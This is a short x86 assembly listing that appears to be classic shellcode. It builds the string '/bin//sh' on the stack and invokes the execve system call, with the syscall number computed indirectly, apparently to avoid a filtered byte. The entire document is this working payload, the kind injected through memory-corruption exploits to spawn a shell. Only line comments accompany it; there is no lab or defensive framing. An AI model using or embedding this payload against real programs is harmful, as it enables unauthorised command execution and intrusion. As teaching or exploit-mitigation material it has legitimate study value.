.text
xorl %eax,%eax
pushl %eax              # push 0 into stack (end of string)
pushl $0x68732f2f       # push "//sh" into stack
pushl $0x6e69622f       # push "/bin" into stack
movl %esp,%ebx          # %ebx = name[0]
pushl %eax              # name[1]
pushl %ebx              # name[0]
movl %esp,%ecx          # %ecx = name
cdq                     # %edx = 0
movb $0x1b, %al
subb $0x10, %al
int $0x80
